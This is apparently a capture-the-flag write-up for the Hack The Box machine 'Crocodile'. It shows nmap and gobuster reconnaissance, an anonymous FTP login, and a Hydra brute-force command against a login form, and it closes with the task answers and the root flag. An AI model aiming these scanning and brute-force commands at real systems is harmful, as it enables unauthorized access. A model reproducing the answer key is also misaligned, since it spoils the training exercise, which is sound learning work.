---
layout: single
title: Crocodile - Hack The Box
excerpt: "In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra."
date: 2025-03-10
classes: wide
header:
  teaser: /img2/crocodile.png
  teaser_home_page: true
  icon: /img2/images/hackthebox.webp
categories:
  - hackthebox
  - Linux
  - Very Easy
tags:
  - FTP
---

![](/img2/Pasted%20image%2020250310120957.png)

## Introduction

> In this machine, we are taking advantage of FTP anonymous login and exploiting the login anel with Hydra.

## Reconnaissance

- Connectivity

```bash
ping -c1 10.129.1.15
```

- Nmap

```bash
nmap -sS --open -p- --min-rate 5000 -vvv -n -Pn 10.129.1.15
```

![](/img2/Pasted%20image%2020250310122012.png)

- Vulnerability scanning with nmap

```bash
nmap -sV -sC -p21,80 10.129.1.15
```

![](/img2/Pasted%20image%2020250310122217.png)

- Fuzzing with gobuster

```bash
gobuster dir -u http://10.129.1.15/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --add-slash -t 100
```

![](/img2/Pasted%20image%2020250310123251.png)

## Exploitation

- Login FTP with anonymous user

```bash
ftp 10.129.1.15
```

![](/img2/Pasted%20image%2020250310122549.png)

> Password --> anonymous

- Brute forcing login pannel with hydra

- Check the pannel login request 

![](/img2/Pasted%20image%2020250310123726.png)

![](/img2/Pasted%20image%2020250310123820.png)

- Run attack with hydra

```bash
hydra -L allowed.userlist -P allowed.userlist.passwd 10.129.1.15 http-post-form "/login.php:Username=^USER^&Password=^PASS^&Submit=Login:F=Warning\!"
```

![](/img2/Pasted%20image%2020250310125148.png)

## Tasks

1. What Nmap scanning switch employs the use of default scripts during a scan?
> -sC

2. What service version is found to be running on port 21? 
> vsftpd 3.0.3

3. What FTP code is returned to us for the "Anonymous FTP login allowed" message?
> 230

4. After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?
> anonymous

5. After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?
> get

6. What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?
> admin

7. What version of Apache HTTP Server is running on the target host? 
> Apache httpd 2.4.41

8. What switch can we use with Gobuster to specify we are looking for specific filetypes?
> -x

9. Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?
> login.php

10. Submit root flag
> c7110277ac44d78b6a9fff2232434d16

![](/img2/Pasted%20image%2020250310125709.png)
